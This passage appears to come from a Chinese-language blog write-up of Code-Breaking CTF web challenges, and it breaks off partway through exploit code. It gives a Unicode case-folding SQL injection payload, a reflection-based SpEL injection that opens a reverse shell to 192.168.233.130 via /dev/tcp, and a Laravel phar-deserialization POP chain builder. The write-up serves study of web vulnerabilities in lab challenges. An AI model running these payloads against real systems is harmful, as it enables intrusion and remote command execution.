VALUES ('<span class="subst">$&#123;config.flag&#125;</span>')`</span>)</span><br><span class="line"></span><br><span class="line">    router.all(<span class="string">'login'</span>, <span class="string">'/login/'</span>, login).get(<span class="string">'admin'</span>, <span class="string">'/'</span>, admin).get(<span class="string">'static'</span>, <span class="string">'/static/:path(.+)'</span>, <span class="keyword">static</span>).get(<span class="string">'/source'</span>, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + <span class="string">'/views'</span>, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: <span class="string">'underscore'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        extension: <span class="string">'html'</span></span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">static</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        <span class="keyword">return</span> ctx.redirect(ctx.router.url(<span class="string">'login'</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'admin'</span>, &#123;</span><br><span class="line">        <span class="string">'user'</span>: ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>关键代码在于 safeKeyword() 函数，过滤了 union 和 select</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>p 牛在<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">博客</a>中提到过如下特性，但是也适用于 python 中，这样就可以绕过保护函数，达到注入的目的</p>
-<blockquote>
-<p>“ ı “.toUpperCase() == ‘ I ‘</p>
-<p>“ ſ “.toUpperCase() == ‘ S ‘</p>
-<p>“ K “.toLowerCase() == ‘ k ‘</p>
-</blockquote>
-</li>
-<li><p>payload : </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">username=peri0d&amp;password=<span class="string">' un%C4%B1on %C5%BFelect 1,(%C5%BFelect flag from flags),3'</span></span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="javacon"><a href="#javacon" class="headerlink" title="javacon"></a>javacon</h1><ul>
-<li><p>EI 表达式注入，<a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a></p>
-</li>
-<li><p>基础知识</p>
-<ul>
-<li><a href="https://peri0d.xyz/2019/09/10/SpEL%20%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">SpEL 注入</a></li>
-<li><a href="https://peri0d.xyz/2019/09/10/Java%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">Java 反射机制</a></li>
-<li><a href="https://peri0d.xyz/2019/09/10/%E5%8F%8D%E5%BC%B9%20shell/" target="_blank" rel="noopener">Linux 反弹 shell</a></li>
-</ul>
-</li>
-<li><p>目录结构如下</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_1.PNG" alt></p>
-</li>
-<li><p>SpringBoot 框架，看了一下 Spring 表达式</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">        <span class="comment">//构造上下文：准备比如变量定义等等表达式运行需要的上下文数据 </span></span><br><span class="line">        EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(); </span><br><span class="line">        <span class="comment">//创建解析器：提供SpelExpressionParser默认实现 </span></span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser(); </span><br><span class="line">        <span class="comment">//解析表达式：使用ExpressionParser来解析表达式为相应的Expression对象 </span></span><br><span class="line">        Expression expression = </span><br><span class="line">        parser.parseExpression(<span class="string">"('Hello' + ' World').concat(#end)"</span>); </span><br><span class="line">          </span><br><span class="line">        <span class="comment">//设置上下文中的变量的值 </span></span><br><span class="line">        context.setVariable(<span class="string">"end"</span>, <span class="string">"!SpringEL"</span>); </span><br><span class="line">        <span class="comment">//执行表达式，获取运行结果 </span></span><br><span class="line">        String str = (String)expression.getValue(context); </span><br><span class="line">        <span class="comment">// the str=Hello World!SpringEL</span></span><br><span class="line">        System.out.println(<span class="string">"the str="</span>+str); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>先看配置文件 <code>application.yml</code>，提供了一个黑名单和用户列表</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  thymeleaf:</span></span><br><span class="line"><span class="attr">    encoding:</span> <span class="string">UTF-8</span></span><br><span class="line"><span class="attr">    cache:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">    mode:</span> <span class="string">HTML</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">  blacklist:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">java.+lang</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">Runtime</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">exec.*\(</span></span><br><span class="line"><span class="attr">user:</span></span><br><span class="line"><span class="attr">  username:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">  password:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">  rememberMeKey:</span> <span class="string">c0dehack1nghere1</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>文件结构 : </p>
-<ul>
-<li><code>SmallEvaluationContext.java</code> 实现构造上下文的功能</li>
-<li><code>ChallengeApplication.java</code> 实现启动功能</li>
-<li><code>Encryptor.java</code> 实现 <code>AES</code> 加解密</li>
-<li><code>KeyworkProperties.java</code> 实现黑名单</li>
-<li><code>UserConfig.java</code> 实现用户模型，其中的 <code>RememberMe</code> 用到了 <code>Encryptor</code></li>
-<li><code>MainController.java</code> 控制程序的主要逻辑</li>
-</ul>
-</li>
-<li><p>主要看 <code>MainController.java</code> 中的代码，在 <code>login</code> 功能处，如果勾选 <code>Remember me</code> 就会返回一个加密之后的 cookie，然后跳转到 <code>hello.html</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/login"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(@RequestParam(value = <span class="string">"username"</span>, required = <span class="keyword">true</span>)</span> String username,</span></span><br><span class="line"><span class="function">                        @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"password"</span>, required = <span class="keyword">true</span>)</span> String password,</span></span><br><span class="line"><span class="function">                        @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"remember-me"</span>, required = <span class="keyword">false</span>)</span> String isRemember,</span></span><br><span class="line"><span class="function">                        HttpSession session, HttpServletResponse response)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (userConfig.getUsername().contentEquals(username) &amp;&amp; userConfig.getPassword().contentEquals(password)) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isRemember != <span class="keyword">null</span> &amp;&amp; !isRemember.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                Cookie c = <span class="keyword">new</span> Cookie(<span class="string">"remember-me"</span>, userConfig.encryptRememberMe());</span><br><span class="line">                c.setMaxAge(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span>);</span><br><span class="line">                response.addCookie(c);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login-error"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_2.PNG" alt></p>
-</li>
-<li><p>对敏感信息 <code>cookie</code> 的操作如下，首先判断 <code>remember-me</code> 是否存在，然后获取其值进行解密，直接将它赋值给 <code>username</code>，接下来就是使用 <code>getAdvanceValue()</code> 这个自定义函数赋值给 <code>name</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>, required = <span class="keyword">false</span>)</span> String rememberMeValue,HttpSession session,Model model) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            String username = userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">            <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="keyword">null</span> || username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        model.addAttribute(<span class="string">"name"</span>, getAdvanceValue(username.toString()));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ul>
-<ul>
-<li><p><code>getAdvanceValue</code> 函数如下，就是与黑名单匹配，如果匹配则抛出 <code>FORBIDDEN</code>，否则进行正常的 SpEL 解析</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getAdvanceValue</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String keyword: keyworkProperties.getBlacklist()) &#123;</span><br><span class="line">            Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val);</span><br><span class="line">            <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpClientErrorException(HttpStatus.FORBIDDEN);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">        Expression exp = parser.parseExpression(val, parserContext);</span><br><span class="line">        SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line">        <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这里就是 SpEL 注入实现 RCE 了，在不指定 <code>EvaluationContext</code> 时，默认采用的是 <code>StandardEvaluationContext</code> ，这里还进行了黑名单匹配，利用反射就可以绕过黑名单</p>
-</li>
-<li><p>在 JAVA 中，通过 <code>java.lang.Runtime.getRuntime().exec(cmd)</code> 来执行命令，这里可以利用反射写一个反弹 shell 来 getshell，构造 payload 如下 : </p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1"&#125;)&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>加密之后修改 cookie 发送</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sss</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String x = <span class="string">"#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1\"&#125;)&#125;"</span>;</span><br><span class="line">        String y = Encryptor.encrypt(<span class="string">"c0dehack1nghere1"</span>, <span class="string">"0123456789abcdef"</span>, x);</span><br><span class="line">        print(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>实现反弹 shell</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_3.PNG" alt></p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_4.PNG" alt></p>
-</li>
-</ul>
-<h1 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h1><ul>
-<li><p>寻找 POP 链，phar 反序列化，GitHub 给的 docker 环境好像有点问题</p>
-</li>
-<li><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/lumenserial" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/lumenserial</a></p>
-</li>
-<li><p>首先看一下路由信息，当访问 <code>/server/editor</code> 时会调用 <code>App\Http\Controllers</code> 的 <code>main</code> 方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$router-&gt;get(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br><span class="line">$router-&gt;post(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>进入 <code>EditorController.php</code> 文件，存在 <code>doUploadImage</code>，<code>doCatchimage</code>，<code>doListImage</code>，<code>doConfig</code> 的功能。进入 <code>main</code>，从 url 获取 action 参数，如果 action 存在就执行这个函数，返回结果均为 json 格式</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $action = $request-&gt;query(<span class="string">'action'</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string($action) &amp;&amp; method_exists(<span class="keyword">$this</span>, <span class="string">"do&#123;$action&#125;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func([<span class="keyword">$this</span>, <span class="string">"do&#123;$action&#125;"</span>], $request);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FileException(<span class="string">'Method error'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> response()-&gt;json([<span class="string">'state'</span> =&gt; $e-&gt;getMessage()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在 <code>download</code> 函数中，<code>$url</code> 未经过滤就传给了 <code>file_get_contents</code>，而 <code>$url</code> 源自 <code>doCatchimage</code> 中的 <code>$request-&gt;input($this-&gt;config[&#39;catcherFieldName&#39;])</code>，查看配置文件 <code>/resources/editor/config.json</code> 就可以知道其值为 <code>source</code>，也就是 url 中的 source 参数，然后就可以利用 phar 反序列化</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">    $rets = [];</span><br><span class="line">    <span class="keyword">if</span> ($sources) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">            $rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response()-&gt;json([</span><br><span class="line">        <span class="string">'state'</span> =&gt; <span class="string">'SUCCESS'</span>,</span><br><span class="line">        <span class="string">'list'</span> =&gt; $rets</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以直接根据已有的 payload 构造反序列化 <a href="https://xz.aliyun.com/t/6059" target="_blank" rel="noopener">https://xz.aliyun.com/t/6059</a></p>
-</li>
-<li><p>exp : </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $connection;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\Generator\MockDefinition($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = [<span class="keyword">new</span> \Mockery\Loader\EvalLoader(), <span class="string">'load'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $evilCode;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $name = <span class="string">'abcdefg'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	$<span class="title">code</span> = "&lt;?<span class="title">php</span> <span class="title">phpinfo</span>(); <span class="keyword">exit</span>; <span class="meta">?&gt;</span><span class="string">";</span></span><br><span class="line"><span class="string">	$exps = new \Illuminate\Broadcasting\PendingBroadcast($code);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $p = new Phar('exp.phar', 0, 'exp.phar');</span></span><br><span class="line"><span class="string">    $p-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;');</span></span><br><span class="line"><span class="string">    $p-&gt;setMetadata($exps);</span></span><br><span class="line"><span class="string">    $p-&gt;addFromString('1.txt','text');</span></span><br><span class="line"><span class="string">    $p-&gt;stopBuffering();</span></span><br><span class="line"><span 